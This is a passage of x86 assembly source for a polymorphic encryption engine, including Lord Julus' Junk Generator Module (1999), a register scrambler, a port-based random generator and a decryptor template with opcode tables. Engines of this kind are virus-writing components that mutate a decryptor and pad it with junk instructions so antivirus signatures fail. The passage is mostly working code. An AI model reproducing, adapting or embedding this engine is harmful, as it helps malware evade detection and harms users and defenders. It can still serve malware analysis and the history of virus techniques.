special_ok_procs:                          ;
      cmp increment_flag, 1                ; If we stored suplemental bytes
      jne no_increment                     ; we need to move edi forward.
      inc edi                              ;
      mov increment_flag, 0                ;
                                           ;
no_increment:                              ;
      ret                                  ; and return
makeinstr endp                             ;
                                           ;
procs dd offset proc01                     ; this is simply a shortcut...
      dd offset proc02                     ; To jump to a certain instr.
      dd offset proc03                     ; procedure I simply retrieve it's
      dd offset proc04                     ; address from this array and jump
      dd offset proc05                     ; to it...
      dd offset proc06                     ;
      dd offset proc07                     ;
      dd offset proc08                     ;
      dd offset proc09                     ;
      dd offset proc10                     ;
      dd offset proc11                     ;
      dd offset proc12                     ;
                                           ;

;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; ²±°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; ²±°
; ²±°  Lord Julus' Junk Generator Module V.1.0 (March 1999)                 ²
; ²±                                                                       ±²
; ²                                                                       °±²
;                                                                         °±²
; °°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°±²

makejunk proc near                              ; This is the main junk
      push eax ebx ecx edx esi                  ;
      mov ecx, maxjunks                         ; routine.
junk_loop:                                      ;
      call _makejunk                            ;
      loop junk_loop                            ;
      pop esi edx ecx ebx eax                   ;
      ret                                       ;
makejunk endp                                   ;
                                                ;
_makejunk proc near                             ; Generate junk!
      push eax                                  ;
      mov eax, 5                                ; choose between safe junks
      call brandom32                            ; and junks that might
      cmp eax, 3                                ; generate exception errors
      jae flawable_junk                         ;
                                                ;
      call make_sure_junk                       ;
      jmp exit_junk                             ;
                                                ;
flawable_junk:                                  ;
      call make_flaw_junk                       ;
                                                ;
exit_junk:                                      ;
      pop eax                                   ;
      ret                                       ; and return
_makejunk endp                                  ;
                                                ;
make_flaw_junk proc near                        ; Here we will generate
      push eax ebx ecx edx                      ; junks that could raise
      mov eax, max_junk_hunk                    ; exception errors...
      call brandom32                            ;
      inc eax                                   ;
                                                ;
      mov [ebp+flawable], 0                     ; (mark the type)
                                                ;
      mov ecx, eax                              ;
                                                ;
      mov al, 0E9h                              ; ...and so we generate a
      stosb                                     ; Jump to skip them
      mov [ebp+address_save], edi               ; save jump place
      mov eax, 0                                ;
      stosd                                     ;
                                                ;
repeat_makejunk:                                ;
      call output_one_junk                      ; now we make the junks
      loop repeat_makejunk                      ;
                                                ;
      push edi                                  ;
      sub edi, [ebp+address_save]               ; and create the jump
      mov eax, edi                              ; address
      sub eax, 4                                ;
      mov edi, [ebp+address_save]               ;
      stosd                                     ;
      pop edi                                   ;
                                                ;
      pop edx ecx ebx eax                       ;
      ret                                       ;
make_flaw_junk endp                             ;
                                                ;
make_sure_junk proc near                        ;
      push eax ebx ecx edx                      ; junks that could raise
      mov eax, max_junk_hunk                    ; exception errors...
      call brandom32                            ;
      inc eax                                   ;
                                                ;
      mov [ebp+flawable], 1                     ; (mark type)
                                                ;
      mov ecx, eax                              ;
                                                ;
repeat_makejunk_2:                              ;
      call output_one_junk                      ; now we make the junks
      loop repeat_makejunk_2                    ;
                                                ;
      pop edx ecx ebx eax                       ;
      ret                                       ;
make_sure_junk endp                             ;
                                                ;
output_one_junk proc                            ; This procedure outputs
      push ecx                                  ; one junk instruction
                                                ;
      call choose_random_disp                   ; First choose displacements
                                                ;
choose_another:                                 ;
      mov eax, Table_numbers                    ; Choose one instruction
      call brandom32                            ; table
                                                ;
      cmp [ebp+we_create_jcond], 1              ; prevent reentry
      jne no_case                               ; when creating conditional
      cmp eax, 3                                ; jumps
      je choose_another                         ;
      cmp eax, 5                                ;
      je choose_another                         ;
                                                ;
no_case:                                        ;
      cmp [ebp+flawable], 1                     ; if the instruction mustn't
      jne go_on_unstopped                       ; generate exception errors
      cmp eax, 0                                ; we cannot use table 1!
      je choose_another                         ;
                                                ;
go_on_unstopped:                                ;
      lea ebx, dword ptr [ebp+junk_table_procs] ; take out the procedure
      shl eax, 2                                ;
      add ebx, eax                              ;
      mov eax, dword ptr [ebx]                  ;
      add eax, ebp                              ;
      jmp eax                                   ; and jump to it...
                                                ;
junk_proc1:                                     ; here we use table1
      mov eax, 2                                ;
      call brandom32                            ;
      mov ebx, eax                              ; save possible increment
      add ebx, 2                                ; 2 or 3...
                                                ;
      mov eax, Table1_len                       ; take a random operation
      call brandom32                            ; from the Table1
      shl eax, 1                                ;
      lea esi, dword ptr [ebp+Table1]           ;
      add esi, eax                              ;
      lodsb                                     ;
      add eax, ebx                              ; toggle size
      stosb                                     ;
                                                ;
      lea esi, dword ptr [ebp+ModRM]            ; take a modrm byte
      call choose_jreg                          ; choose the random jreg
      mov edx, eax                              ;
      mov eax, 32                               ; and a random addressing
      call brandom32                            ; type
      mov dword ptr [ebp+row], eax              ; save the row
      shl eax, 3                                ;
      add esi, eax                              ;
      add esi, edx                              ;
      lodsb                                     ;
      stosb                                     ; store modrm
                                                ;
      mov eax, 2                                ; choose addressing type
      call brandom32                            ;
                                                ;
      cmp eax, 1                                ; is it 32bit addressing?
      je _32bit_addressing                      ;
                                                ;
      mov ax, word ptr [edi-2]                  ; if it's 16bit then we
      shl eax, 10                               ; must go behind the opcode
      dec edi                                   ;
      dec edi                                   ;
      mov al, Address_size_toggle               ; and put an Address size
      stosb                                     ; toggle prefix there
      shr eax, 10                               ;
      stosw                                     ;
                                                ;
_16bit_addressing:                              ;
      mov edx, dword ptr [ebp+row]              ; restore row in edx
      cmp edx, 6                                ; DISP16 needed ?
      jne not_exc_1                             ;
      mov ax, word ptr [ebp+disp16]             ;
      stosw                                     ;
                                                ;
      jmp finish_processing_1                   ;
                                                ;
not_exc_1:                                      ;
      cmp edx, 7                                ; Need to add a DISP8 ?
      jbe not_exc_2                             ;
      cmp edx, 16                               ;
      jae not_exc_2                             ;
      mov al, byte ptr [ebp+disp8]              ;
      stosb                                     ;
                                                ;
      jmp finish_processing_1                   ;
                                                ;
not_exc_2:                                      ;
      cmp edx, 15                               ; Need to add a DISP16 ?
      jbe not_exc_3                             ;
      cmp edx, 24                               ;
      jae not_exc_3                             ;
      mov ax, word ptr [ebp+disp16]             ;
      stosw                                     ;
                                                ;
      jmp finish_processing_1                   ;
                                                ;
not_exc_3:                                      ;
      jmp finish_processing_1                   ;
                                                ;
_32bit_addressing:                              ;
      mov edx, dword ptr [ebp+row]              ; restore row in edx
      cmp edx, 5                                ;
      jne not_exc_4                             ;
      mov eax, dword ptr [ebp+disp32]           ;
      stosd                                     ;
      jmp finish_processing_1                   ;
                                                ;
not_exc_4:                                      ;
      cmp edx, 4                                ;
      je need_sib                               ;
      cmp edx, 12                               ;
      je need_sib                               ;
      cmp edx, 20                               ;
      je need_sib                               ;
                                                ;
      cmp edx, 7                                ; Need to add a DISP8 ?
      jbe not_exc_5                             ;
      cmp edx, 16                               ;
      jae not_exc_5                             ;
      mov al, byte ptr [ebp+disp8]              ;
      stosb                                     ;
      jmp finish_processing_1                   ;
                                                ;
not_exc_5:                                      ;
      cmp edx, 15                               ; Need to add a DISP32 ?
      jbe not_exc_6                             ;
      cmp edx, 24                               ;
      jae not_exc_6                             ;
      mov eax, dword ptr [ebp+disp32]           ;
      stosd                                     ;
      jmp finish_processing_1                   ;
                                                ;
not_exc_6:                                      ;
      jmp finish_processing_1                   ;
                                                ;
need_sib:                                       ; if we need a SIB byte
      lea esi, dword ptr [ebp+ModRM]            ; we compute it rite here...
      mov eax, 8                                ;
      call brandom32                            ;
      mov ebx, eax                              ;
      mov eax, 32                               ;
      call brandom32                            ;
      cmp eax, 4                                ;
      je need_sib                               ;
      cmp eax, 12                               ;
      je need_sib                               ;
      cmp eax, 20                               ;
      je need_sib                               ;
      shl eax, 3                                ;
      add esi, eax                              ;
      add esi, ebx                              ;
      lodsb                                     ;
      stosb                                     ;
      cmp edx, 12                               ;
      jne maybe_32                              ;
      mov al, byte ptr [ebp+disp8]              ;
      stosb                                     ;
      jmp finish_processing_1                   ;
                                                ;
maybe_32:                                       ;
      cmp edx, 20                               ;
      jne finish_processing_1                   ;
      mov eax, dword ptr [ebx+disp32]           ;
      stosd                                     ;
      jmp finish_processing_1                   ;
                                                ;
finish_processing_1:                            ;
      jmp over_one_junk                         ;
                                                ;
junk_proc2:                                     ; here we use Table 2
      mov eax, 2                                ;
      call brandom32                            ;
      mov ebx, eax                              ;
      mov ebx, 1                                ; force 16/32bit
      mov eax, Table2_len                       ; take a random operation
      call brandom32                            ; from the Table2
      shl eax, 1                                ;
      lea esi, dword ptr [ebp+Table2]           ;
      add esi, eax                              ;
      lodsb                                     ;
      add eax, ebx                              ; toggle size
      stosb                                     ;
                                                ;
      xor eax, eax                              ;
      call choose_jreg                          ;
      mov ebx, eax                              ;
      shl bx, 3                                 ;
      call choose_jreg                          ;
      or bl, al                                 ;
      mov al, bl                                ;
      or al, 11000000b                          ; make reg to reg
      stosb                                     ;
                                                ;
      jmp over_one_junk                         ;
                                                ;
junk_proc3:                                     ;
      mov eax, Table3_len-2                     ; take a random operation
      call brandom32                            ; from the Table3
      shl eax, 1                                ;
      lea esi, dword ptr [ebp+Table3]           ;
      add esi, eax                              ;
      lodsb                                     ;
      xchg eax, ebx                             ;
      call choose_jreg                          ;
      add ebx, eax                              ;
      xchg eax, ebx                             ;
      stosb                                     ;
                                                ;
      jmp over_one_junk                         ;
                                                ;
junk_proc4:                                     ; Here we create short
      mov [ebp+we_create_jcond], 1              ; conditional jumps
      lea esi, dword ptr [ebp+Table4]           ;
      lodsb                                     ;
      xchg eax, ebx                             ;
      mov eax, 0eh                              ;
      call brandom32                            ;
      add ebx, eax                              ;
      xchg eax, ebx                             ;
      stosb                                     ;
      xor al, al                                ;
      stosb                                     ;
                                                ;
      push word ptr [ebp+flawable]              ;
                                                ;
      mov [ebp+flawable], 1                     ;
                                                ;
      push edi                                  ;
      call output_one_junk                      ; output one junk after
      pop ebx                                   ; the conditional jump
      push ebx                                  ;
      xchg edi, ebx                             ;
      sub ebx, edi                              ;
      add edi, ebx                              ;
      pop esi                                   ;
      dec esi                                   ;
      mov byte ptr [esi], bl                    ;
                                                ;
      mov [ebp+we_create_jcond], 0              ;
                                                ;
      pop word ptr [ebp+flawable]               ;
                                                ;
      jmp over_one_junk                         ;
                                                ;
junk_proc5:                                     ;
      call choose_jreg                          ; Make imm to reg
      mov ebx, eax                              ; choose the register
      mov eax, Table5_len                       ; take a random operation
      call brandom32                            ; from the Table1
      mov eax, 1                                ; force 16/32 bit
      mov ecx, eax                              ; save type
      shl eax, 1                                ;
      lea esi, dword ptr [ebp+Table5]           ;
      add esi, eax                              ;
      lodsb                                     ;
      add eax, ebx                              ;
                                                ;
      stosb                                     ; store opcode
                                                ;
; don't unmark these!!! I need some more conditions to make 8 bit mov
;      cmp ecx, 1                                ;
;      je mov_1632bit                            ; 16 or 32 bit?
;                                                ;
;mov_8bit:                                       ;
;      mov al, byte ptr [ebp+disp8]              ; 8 bit imm
;      stosb                                     ;
;      jmp quit_mov                              ;
                                                ;
mov_1632bit:                                    ;
      mov eax, 2                                ; choose between 16 and
      call brandom32                            ; 32 bit
      cmp eax, 0                                ;
      je do_16                                  ;
      mov eax, dword ptr [ebp+disp32]           ; 32 bit imm
      stosd                                     ;
      jmp quit_mov                              ;
                                                ;
do_16:                                          ;
      dec edi                                   ; 16 bit imm
      mov al, byte ptr [edi]                    ; we need to override
      mov byte ptr [edi+1], al                  ; the operand size
      mov byte ptr [edi], 66h                   ;
      add edi, 2                                ;
      mov ax, word ptr [ebp+disp16]             ;
      stosw                                     ;
                                                ;
quit_mov:                                       ; done!
      jmp over_one_junk                         ;
                                                ;
junk_proc6:                                     ;
      mov [ebp+we_create_jcond], 1              ;
      mov al, 0fh                               ;
      stosb                                     ;
      lea esi, dword ptr [ebp+Table6]           ;
      lodsb                                     ;
      xchg eax, ebx                             ;
      mov eax, 0eh                              ;
      call brandom32                            ;
      add ebx, eax                              ;
      xchg eax, ebx                             ;
      stosb                                     ;
      xor eax, eax                              ;
      stosd                                     ;
                                                ;
      push word ptr [ebp+flawable]              ;
                                                ;
      mov [ebp+flawable], 1                     ;
                                                ;
      push edi                                  ;
      call output_one_junk                      ;
      pop ebx                                   ;
      push ebx                                  ;
      xchg edi, ebx                             ;
      sub ebx, edi                              ;
      add edi, ebx                              ;
      pop esi                                   ;
      sub esi, 4                                ;
      mov dword ptr [esi], ebx                  ;
                                                ;
      mov [ebp+we_create_jcond], 0              ;
                                                ;
      pop word ptr [ebp+flawable]               ;
                                                ;
      jmp over_one_junk                         ;
                                                ;
junk_proc7:                                     ;
      mov eax, Table7_len                       ; take a random operation
      call brandom32                            ; from the Table1
      shl eax, 1                                ;
      lea esi, dword ptr [ebp+Table7]           ;
      add esi, eax                              ;
      lodsb                                     ;
      stosb                                     ;
                                                ;
      jmp over_one_junk                         ;
                                                ;
over_one_junk:                                  ;
                                                ;
      pop ecx                                   ;
      ret                                       ;
output_one_junk endp                            ;
                                                ;
junk_table_procs label                          ; junk procs addresses
                 dd offset junk_proc1           ;
                 dd offset junk_proc2           ;
                 dd offset junk_proc3           ;
                 dd offset junk_proc4           ;
                 dd offset junk_proc5           ;
                 dd offset junk_proc6           ;
                 dd offset junk_proc7           ;
                                                ;
choose_jreg proc near                           ; choose one random junk
      mov eax, 3                                ; register out of the 3
      call brandom32                            ; available
      cmp eax, 0                                ;
      jne not_0                                 ;
      xor eax, eax                              ;
      mov al, jreg1                             ;
      ret                                       ;
not_0:                                          ;
      cmp eax, 1                                ;
      jne not_1                                 ;
      xor eax, eax                              ;
      mov al, jreg2                             ;
      ret                                       ;
not_1:                                          ;
      xor eax, eax                              ;
      mov al, jreg3                             ;
      ret                                       ;
choose_jreg endp                                ;
                                                ;
choose_random_disp proc near                    ; choose random displacements
      push eax                                  ;
      call random32                             ;
      mov dword ptr [ebp+disp32], eax           ; 32bit
      call random32                             ;
      mov word ptr [ebp+disp16], ax             ; 16bit
      call random32                             ;
      mov byte ptr [ebp+disp8], al              ; 8bit
      pop eax                                   ;
      ret                                       ;
choose_random_disp endp                         ;
                                                ;
maxjunks      =  5                              ;
max_junk_hunk =  3                              ;
row           dd 0                              ;

ModRM label
; The Intel(C) instruction set comes in the following mode:
;
;       Prefixes, Opcode, Mod/RM, SIB, immediate
;
;       The Mod/RM and SIB bytes are defined in the following table:
;
;ÕÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¸
;³ MOD/RM AND SIB BYTE VALUES FOR ALL ADDRESSING MODES USED                 ³
;ÆÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÑÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍµ
;³ AL   CL   DL   BL   AH   CH   DH   BH    ³ 8BIT REGISTER                 ³
;³ AX   CX   DX   BX   SP   BP   SI   DI    ³ 16BIT REGISTER                ³
;³ EAX  ECX  EDX  EBX  ESP  EBP  ESI  EDI   ³ 32BIT REGISTER                ³
;³ 0    1    2    3    4    5    6    7     ³ ORDER                         ³
;³ 000  001  010  011  100  101  110  111   ÆÍÍÍÍÍÍÍÍÍÍÍÑÍÍÍÍÍÍÍÍÍÑÍÍÍÍÍÍÍÍÍµ
;³ MOD/RM VALUE: (MOD = 00)                 ³16BIT ADDR ³32BIT AD.³SCALE    ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄ´
db 000h,008h,010h,018h,020h,028h,030h,038h ;³[BX+SI]    ³[EAX]    ³[EAX]    ³
db 001h,009h,011h,019h,021h,029h,031h,039h ;³[BX+DI]    ³[ECX]    ³[ECX]    ³
db 002h,00Ah,012h,01Ah,022h,02Ah,032h,03Ah ;³[BP+SI]    ³[EDX]    ³[EDX]    ³
db 003h,00Bh,013h,01Bh,023h,02Bh,033h,03Bh ;³[BP+DI]    ³[EBX]    ³[ECX]    ³
db 004h,00Ch,014h,01Ch,024h,02Ch,034h,03Ch ;³[SI]       ³[--]     ³NONE     ³
db 005h,00Dh,015h,01Dh,025h,02Dh,035h,03Dh ;³[DI]       ³D32      ³[EBP]    ³
db 006h,00Eh,016h,01Eh,026h,02Eh,036h,03Eh ;³D16        ³[ESI]    ³[ESI]    ³
db 007h,00Fh,017h,01Fh,027h,02Fh,037h,03Fh ;³[BX]       ³[EDI]    ³[EDI]    ³
; MOD/RM VALUE: (MOD = 01)                  ³           ³         ³         ³
db 040h,048h,050h,058h,060h,068h,070h,078h ;³[BX+SI+D8] ³[EAX+D8] ³[EAX*2]  ³
db 041h,049h,051h,059h,061h,069h,071h,079h ;³[BX+DI+D8] ³[ECX+D8] ³[ECX*2]  ³
db 042h,04Ah,052h,05Ah,062h,06Ah,072h,07Ah ;³[BP+SI+D8] ³[EDX+D8] ³[EDX*2]  ³
db 043h,04Bh,053h,05Bh,063h,06Bh,073h,07Bh ;³[BP+DI+D8] ³[EBX+D8] ³[EBX*2]  ³
db 044h,04Ch,054h,05Ch,064h,06Ch,074h,07Ch ;³[SI+D8]    ³[--+D8]  ³NONE     ³
db 045h,04Dh,055h,05Dh,065h,06Dh,075h,07Dh ;³[DI+D8]    ³[EBP+D8] ³[EBP*2]  ³
db 046h,04Eh,056h,05Eh,066h,06Eh,076h,07Eh ;³[BP+D8]    ³[ESI+D8] ³[ESI*2]  ³
db 047h,04Fh,057h,05Fh,067h,06Fh,077h,07Fh ;³[BX+D8]    ³[EDI+D8] ³[EDI*2]  ³
; MOD/RM VALUE (MOD = 10)                   ³           ³         ³         ³
db 080h,088h,090h,098h,0A0h,0A8h,0B0h,0B8h ;³[BX+SI+D16]³[EAX+D32]³[EAX*4]  ³
db 081h,089h,091h,099h,0A1h,0A9h,0B1h,0B9h ;³[BX+DI+D16]³[ECX+D32]³[ECX*4]  ³
db 082h,08Ah,092h,09Ah,0A2h,0AAh,0B2h,0BAh ;³[BP+SI+D16]³[EDX+D32]³[EDX*4]  ³
db 083h,08Bh,093h,09Bh,0A3h,0ABh,0B3h,0BBh ;³[BP+DI+D16]³[EBX+D32]³[EBX*4]  ³
db 084h,08Ch,094h,09Ch,0A4h,0ACh,0B4h,0BCh ;³[SI+D16]   ³[--+D32] ³NONE     ³
db 085h,08Dh,095h,09Dh,0A5h,0ADh,0B5h,0BDh ;³[DI+D16]   ³[EBP+D32]³[EBP*4]  ³
db 086h,08Eh,096h,09Eh,0A6h,0AEh,0B6h,0BEh ;³[BP+D16]   ³[ESI+D32]³[ESI*4]  ³
db 087h,08Fh,097h,09Fh,0A7h,0AFh,0B7h,0BFh ;³[BX+D16]   ³[EDI+D32]³[EDI*4]  ³
; MOD/RM VALUE (MOD = 11)                   ³           ³         ³         ³
db 0C0h,0C8h,0D0h,0D8h,0E0h,0E8h,0F0h,0F8h ;³EAX/AX/AL  ³EAX/AX/AL³[EAX*8]  ³
db 0C1h,0C9h,0D1h,0D9h,0E1h,0E9h,0F1h,0F9h ;³ECX/CX/CL  ³ECX/CX/CL³[ECX*8]  ³
db 0C2h,0CAh,0D2h,0DAh,0E2h,0EAh,0F2h,0FAh ;³EDX/DX/DL  ³EDX/DX/DL³[EDX*8]  ³
db 0C3h,0CBh,0D3h,0DBh,0E3h,0EBh,0F3h,0FBh ;³EBX/BX/BL  ³EBX/BX/BL³[EBX*8]  ³
db 0C4h,0CCh,0D4h,0DCh,0E4h,0ECh,0F4h,0FCh ;³ESP/SP/AH  ³ESP/SP/AH³NONE     ³
db 0C5h,0CDh,0D5h,0DDh,0E5h,0EDh,0F5h,0FDh ;³EBP/BP/CH  ³EBP/BP/CH³[EBP*8]  ³
db 0C6h,0CEh,0D6h,0DEh,0E6h,0EEh,0F6h,0FEh ;³ESI/SI/DH  ³ESI/SI/DH³[ESI*8]  ³
db 0C7h,0CFh,0D7h,0DFh,0E7h,0EFh,0F7h,0FFh ;³EDI/DI/BH  ³EDI/DI/BH³[EDI*8]  ³
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÙ

; The prefixes:
Operand_size_toggle     db 66h   ; changes between 16bit and 32bit operands
Address_size_toggle     db 67h   ; changes between 16bit and 32bit addressing

; The toggle bytes (applied by XORing the OpCode with them):
Direction_toggle        db 02h   ; toggles operand->address and address->op.
Size_toggle             db 01h   ; toggles between 8bit and 16bit operators

; The immediate values used:
disp8                   db 0     ; 8bit displacement
disp16                  dw 0     ; 16bit displacement
disp32                  dd 0     ; 32bit displacement

; Reg to/from Address: (second byte 0=only junk register / 1=any register)

Table1 label
db 000h, 0      ; ADD            Explanation:
db 008h, 0      ; OR                - unchaged = 8bit addr  -> 8bit reg
db 010h, 0      ; ADC               - +1       = 16bit addr -> 16bit reg
db 018h, 0      ; SBB               - +2       = 8bit reg   -> 8bit addr
db 020h, 0      ; AND               - +3       = 16bit reg  -> 16bit addr
db 028h, 0      ; SUB
db 030h, 0      ; XOR
db 038h, 1      ; CMP
db 088h, 0      ; MOV
Table1_len = ($-offset Table1)/2

Table2 label
db 084h, 1      ; TEST              - unchanged = 8bit  -> 8bit
db 086h, 0      ; XCHG                +1        = 16bit -> 16bit
Table2_len = ($-offset Table2)/2

Table3 label
db 040h, 0      ; INC               +reg number = INC reg
db 048h, 0      ; DEC               +reg number = DEC reg
db 050h, 0      ; PUSH              +reg number = PUSH reg
db 058h, 0      ; POP               +reg number = POP reg
Table3_len = ($-offset Table3)/2

Table4 label
db 070h, 0      ; Conditonal Jump   +0 .. +0Fh  = jump condition
Table4_len = ($-offset Table4)/2

Table5 label
db 0B0h, 0      ; Mov immediate to 8bit reg      +reg number = mov to reg
db 0B8h, 0      ; Mov immediate to 16/32bit reg  +reg number = mov to reg
Table5_len = ($-offset Table5)/2

Table6 label
db 080h, 0     ; Long conditional jmp
Table6_len = ($-offset Table6)/2

Table7 label
   clc
db 0
   stc
db 0
   cli
db 0
   sti
db 0
   cld
db 0
Table7_len = ($-offset Table7)/2

Tables label
       dd offset Table1
       dd offset Table2
       dd offset Table3
       dd offset Table4
       dd offset Table5
       dd offset Table6
       dd offset Table7

Table_numbers = ($-offset Tables)/4

address_save    dd 0
junk_finish     dd 0
flawable        dw 0
we_create_jcond db 0

;                  ²±°                                ²
;                  ²±    Junk Generator Module End   ±²
;                  ²                                °±²

;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ



;ÛßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßÛ
;Û Here we have the place where the engine chooses the random stuff.         Û
;ÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛ

Choose_random_registers Proc Near         ; Here we choose the random regs
        pushad                            ;
        lea edi, used_registers           ; point to registers
        lea esi, used_registers           ; point to registers
        mov edx, esi                      ; save position
        mov ecx, 50h                      ; scramble 50h times
mangle:                                   ;
        mov eax, 7                        ;
        call brandom32                    ; choose a random nr. between 0-6
        mov ebx, eax                      ; in EBX
        mov eax, 7                        ;
        call brandom32                    ; choose a random nr. between 0-6
        cmp ebx, eax                      ; in EAX
        je mangle                         ; if EAX=EBX choose again
        add edi, eax                      ; increment first pointer
        add esi, ebx                      ; increment second pointer
        mov al, byte ptr [edi]            ; and exchange the values
        xchg byte ptr [esi], al           ; between them
        mov byte ptr [edi], al            ;
        mov edi, edx                      ; restore position
        mov esi, edx                      ;
        loop mangle                       ; and do it 50h times
        popad                             ;
        Retn                              ;
Choose_random_registers Endp              ;
                                          ;
                                          ;
brandom32 proc near                       ;
       push edx                           ; this procedure expects a value
       push ecx                           ;
       mov edx, 0                         ; in EAX and returns a random
       push eax                           ; number in EAX but smaller than
       call random32                      ; EAX's original value. Actually
       pop ecx                            ; it bounds EAX (0<=EAX<=limit-1)
       div ecx                            ; EDX and ECX are preserved
       xchg eax, edx                      ;
       pop ecx                            ;
       pop edx                            ;
       ret                                ;
brandom32 endp                            ;
                                          ;
random32 proc near                        ;
       call random16                      ; this is the random 32 bit
       shl eax, 10h                       ; generator (puts 2 random 16 bit
                                          ; in each side of EAX)
random16:                                 ;
       push ebx                           ; this procedure here gets a
       xor bx, 0F00Dh                      ; random word by reading different
seed   equ word ptr $-2                   ; ports on 8 bits. Great idea
       in al, 40h                         ; from Wild W0rker.
       xor bl, al                         ;
       in al, 42h                         ;
       add bh, al                         ;
       in al, 41h                         ;
       sub bl, al                         ;
       in al, 41h                         ;
       xor bh, al                         ;
       in al, 42h                         ;
       add bl, al                         ;
       in al, 40h                         ;
       sub bh, al                         ;
       mov word ptr [ebp+offset seed], bx ;
       xchg bx, ax                        ;
       pop ebx                            ;
       ret                                ;
random32 endp                             ;


;ÛßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßÛ
;Û Here we have the data on the decryptor generation.                        Û
;ÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛ

decryptor:
i01:  mov ebx, 0                  ; mov preg, code_start
      db 0feh                     ;
i02:  mov ebx, 0                  ; mov kreg, key
      db 0feh                     ;
i03:  mov ebx, 0                  ; mov lreg, code_length/8
      db 0feh                     ;
i04:  mov ebx, dword ptr [ebx]    ; mov creg, [preg] (mainloop)
      db 0feh                     ;
i05:  add ebx, ecx                ; <op1> creg, kreg
      db 0feh                     ;
i06:  ror ebx, 0h                 ; <op2> creg, key2
      db 0feh                     ;
i07:  add ebx, dword ptr [ebx+4]  ; <op3> creg, [preg+4]
      db 0feh                     ;
i08:  mov dword ptr [ebx], ebx    ; mov [preg], creg
      db 0feh                     ;
i09:  add ebx, 12345678h          ; <op4> kreg, keyvalue
      db 0feh                     ;
i10:  add ebx, 4                  ; sub preg, 4
      db 0feh                     ;
i11:  sub ebx, 1                  ; sub lreg, 1
      db 0feh                     ;
i12:  ;jnz 0                      ; jnz mainloop
      db 0fh, 85h                 ;
      dd 0feh                     ;
      db 0ffh                     ;

;ÛßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßÛ
;Û Here we have the engine's general data.                                   Û
;ÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛ

un_op_code1:
       db 33h                ; XOR
       db 2Bh                ; ADD
       db 03h                ; SUB
                             ;
un_op_code2:                 ;
       db 81h, 11110000b     ; XOR
       db 81h, 11101000b     ; SUB
       db 81h, 11000000b     ; ADD
                             ;
un_op_code3:                 ;
       db 11000000b          ; ROL
       db 11001000b          ; ROR
                             ;
key   dd 0                   ;
key2  dd 0                   ;
keyvalue dd 0                ;
op1 dd 0                     ;
op2 dd 0                     ;
op3 dd 0                     ;
op4 dd 0                     ;
                             ;
used_registers:              ;
creg  Db 0                   ; Register to hold the code
lreg  Db 1                   ; Register to hold the length of code
kreg  Db 2                   ; Register to hold the encryption key
preg  Db 3                   ; Register to hold the pointer in code
jreg1 Db 5                   ; Junk register #1
jreg2 Db 6                   ; Junk register #2
jreg3 Db 7                   ; Junk register #3
                             ;
counter dd 0                 ; instruction counter
misc db 0                    ; misc data
codeaddr dd 0                ; address of code
codelength dd 0              ; code length
mainlp dd 0                  ; main loop address
                             ;
increment_flag db 0          ; flag
                             ;
MOF32 endp                   ;
                             ;
                             ;
open_error:                  ;
demo_over:                   ;
       push 0                ;
       Call ExitProcess      ;
end start                    ;
end                          ;